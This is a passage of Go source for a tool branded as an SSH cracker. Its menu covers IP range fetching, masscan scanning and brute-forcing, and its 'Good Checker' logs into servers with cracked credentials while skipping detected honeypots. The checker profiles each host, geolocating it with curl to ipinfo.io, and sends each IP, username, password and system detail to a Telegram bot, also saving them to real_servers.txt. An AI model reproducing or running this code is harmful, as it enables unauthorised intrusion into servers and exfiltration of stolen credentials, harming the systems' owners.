        cpuModel = runCommandWithTimeout(client, `cat /proc/cpuinfo 2>/dev/null | grep "model name" | head -1 | cut -d ':' -f2 | xargs || echo unknown`, 5*time.Second)
    }

    // CPU Cores
    cpuCores := runCommandWithTimeout(client, `nproc 2>/dev/null || echo unknown`, 5*time.Second)

    // Location (IP Geolocation)
    location := runCommandWithTimeout(client, `curl -s --max-time 3 ipinfo.io/ip 2>/dev/null || echo unknown`, 5*time.Second)
    if location != "unknown" {
        geoData := runCommandWithTimeout(client, `curl -s --max-time 3 ipinfo.io/json 2>/dev/null || echo '{}'`, 5*time.Second)
        country := extractJSON(geoData, "country")
        region := extractJSON(geoData, "region")
        city := extractJSON(geoData, "city")
        isp := extractJSON(geoData, "org")
        if country != "" || region != "" || city != "" {
            location = fmt.Sprintf("%s, %s, %s (%s)", city, region, country, isp)
        } else {
            location = "Unknown"
        }
    }

    return hostname, arch, kernel, uptime, ram, cpuModel, cpuCores, location
}

func runCommandWithTimeout(client *ssh.Client, cmd string, timeout time.Duration) string {
    session, err := client.NewSession()
    if err != nil {
        return "unknown"
    }
    defer session.Close()
    var out bytes.Buffer
    session.Stdout = &out
    session.Stderr = &out
    done := make(chan bool)
    go func() {
        session.Run(cmd)
        done <- true
    }()
    select {
    case <-done:
        return strings.TrimSpace(out.String())
    case <-time.After(timeout):
        session.Close()
        return "timeout"
    }
}

func loadGoods(path string) []Server {
    var servers []Server
    file, err := os.Open(path)
    if err != nil {
        fmt.Println("Failed to open file:", err)
        return servers
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        line := strings.TrimSpace(scanner.Text())
        if line == "" || strings.HasPrefix(line, "#") {
            continue
        }

        var ip, port, user, pass string

        if strings.Contains(line, "@") {
            parts := strings.SplitN(line, "@", 2)
            if len(parts) == 2 {
                left := strings.Split(parts[0], ":")
                if len(left) == 2 {
                    ip = strings.TrimSpace(left[0])
                    port = strings.TrimSpace(left[1])
                }
                right := parts[1]
                userPass := strings.SplitN(right, ":", 2)
                if len(userPass) == 2 {
                    user = strings.TrimSpace(userPass[0])
                    pass = strings.TrimSpace(userPass[1])
                } else if len(userPass) == 1 {
                    user = strings.TrimSpace(userPass[0])
                    pass = ""
                }
            }
        } else {
            parts := strings.Fields(line)
            if len(parts) >= 4 {
                ip = parts[0]
                port = parts[1]
                user = parts[2]
                pass = strings.Join(parts[3:], " ")
            }
        }

        if ip != "" && port != "" && user != "" && pass != "" {
            servers = append(servers, Server{
                IP:       ip,
                Port:     port,
                Username: user,
                Password: pass,
            })
        } else if ip != "" && port != "" && user != "" {
            servers = append(servers, Server{
                IP:       ip,
                Port:     port,
                Username: user,
                Password: "",
            })
        }
    }
    return servers
}

func collectInfo(s Server) {
    config := &ssh.ClientConfig{
        User:            s.Username,
        Auth:            []ssh.AuthMethod{ssh.Password(s.Password)},
        HostKeyCallback: ssh.InsecureIgnoreHostKey(),
        Timeout:         8 * time.Second,
    }

    conn, err := ssh.Dial("tcp", net.JoinHostPort(s.IP, s.Port), config)
    if err != nil {
        fmt.Printf("[-] %s:%s connection failed\n", s.IP, s.Port)
        return
    }
    defer conn.Close()

    if isHoneypot(conn) {
        fmt.Printf("[!] %s:%s - HONEYPOT DETECTED! Skipping...\n", s.IP, s.Port)
        return
    }

    fmt.Printf("[+] %s:%s - Real device detected\n", s.IP, s.Port)

    // دریافت اطلاعات کامل
    hostname, arch, kernel, uptime, ram, cpuModel, cpuCores, location := getFullInfo(conn)

    block := fmt.Sprintf(`🖥 REAL SERVER DETECTED!
══════════════════════════════════════════════════
🌐 IP: %s
👤 Username: %s
🔑 Password: %s
📛 Hostname: %s
💾 Architecture: %s
🧰 Kernel: %s
⏱️ Uptime: %s
📀 RAM: %s
⚙️ CPU Model: %s
🔢 CPU Cores: %s
📍 Location: %s
══════════════════════════════════════════════════`,
        s.IP, s.Username, s.Password, hostname, arch, kernel, uptime, ram, cpuModel, cpuCores, location)

    fmt.Println(block)
    sendToTelegram(block)

    realServerLine := fmt.Sprintf("%s|%s|%s|%s|%s|%s|%s|%s|%s", s.IP, s.Port, s.Username, s.Password, hostname, arch, ram, cpuModel, location)
    appendToFile(realServerLine, "real_servers.txt")
}

func extractJSON(jsonStr, key string) string {
    lines := strings.Split(jsonStr, "\n")
    for _, line := range lines {
        if strings.Contains(line, `"`+key+`"`) {
            parts := strings.Split(line, ":")
            if len(parts) > 1 {
                val := strings.Trim(parts[1], `\", `)
                return val
            }
        }
    }
    return ""
}

func sendToTelegram(text string) {
    if botToken == "" || botToken == defaultBotToken {
        return
    }
    url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
    payload := strings.NewReader(fmt.Sprintf("chat_id=%s&text=%s&parse_mode=HTML", chatID, urlEncode(text)))
    req, _ := http.NewRequest("POST", url, payload)
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
    client := &http.Client{Timeout: 10 * time.Second}
    client.Do(req)
}

func urlEncode(text string) string {
    text = strings.ReplaceAll(text, "\n", "%0A")
    text = strings.ReplaceAll(text, " ", "%20")
    return text
}

func runGoodSender() {
    if !verifyLicenseIntegrity() {
        return
    }
    fileName := ask("[+] Enter path to goods file: ", "good.txt")
    botToken = ask("[+] Enter Telegram Bot Token (Don't send it blank.): ", defaultBotToken)
    chatID = ask("[+] Enter Telegram Chat ID (Don't send it blank.): ", defaultChatID)

    fmt.Println("[*] Processing servers...")
    fmt.Println("[*] Honeypots will be automatically skipped!\n")

    servers := loadGoods(fileName)
    if len(servers) == 0 {
        fmt.Println("[!] No valid servers found in file.")
        pause()
        return
    }

    fmt.Printf("[*] Total servers loaded: %d\n", len(servers))

    var wg sync.WaitGroup
    sem := make(chan struct{}, 100)

    for _, s := range servers {
        wg.Add(1)
        sem <- struct{}{}
        go func(server Server) {
            defer func() {
                <-sem
                wg.Done()
            }()
            collectInfo(server)
        }(s)
    }
    wg.Wait()

    fmt.Println("\n[+] Done! Real servers saved to: real_servers.txt")
    pause()
}

func loadLines(path string) []string {
    file, err := os.Open(path)
    if err != nil {
        fmt.Printf("Error reading file: %s\n", path)
        return nil
    }
    defer file.Close()
    var lines []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        line := strings.TrimSpace(scanner.Text())
        if line != "" {
            lines = append(lines, line)
        }
    }
    return lines
}

func setupDirectories() error {
    if err := os.MkdirAll("results/cracker", 0755); err != nil {
        return fmt.Errorf("failed to create directory results/cracker: %v", err)
    }
    return nil
}

// ========== MAIN ==========
func main() {
    for {
        clearScreen()
        fmt.Println("\033[95m╔══════════════════════════════════════════════════╗\033[0m")
        fmt.Println("\033[95m║     @codeparsi SSH CRACKER                       ║\033[0m")
        fmt.Println("\033[95m╠══════════════════════════════════════════════════╣\033[0m")
        fmt.Println("\033[95m║ [1] Fetch IP Ranges                              ║\033[0m")
        fmt.Println("\033[95m║ [2] Masscan Port Scanner                         ║\033[0m")
        fmt.Println("\033[95m║ [3] SSH NLA Checker                              ║\033[0m")
        fmt.Println("\033[95m║ [4] SSH Cracker                                  ║\033[0m")
        fmt.Println("\033[95m║ [5] Good Checker                                 ║\033[0m")
        fmt.Println("\033[95m║ [0] Exit                                         ║\033[0m")
        fmt.Println("\033[95m╚══════════════════════════════════════════════════╝\033[0m")
        fmt.Print("Select option: ")
        var choice string
        fmt.Scanln(&choice)
        switch choice {
        case "1":
            fetchIPRanges()
        case "2":
            runMasscan()
        case "3":
            runSSHChecker()
        case "4":
            if err := setupDirectories(); err != nil {
                fmt.Printf("Failed to set up directories: %v\n", err)
                pause()
                return
            }
            runCracker()
            pause()
        case "5":
            runGoodSender()
            pause()
        case "0":
            fmt.Println("Exiting.")
            os.Exit(0)
        default:
            fmt.Println("Invalid option.")
            pause()
        }
    }
}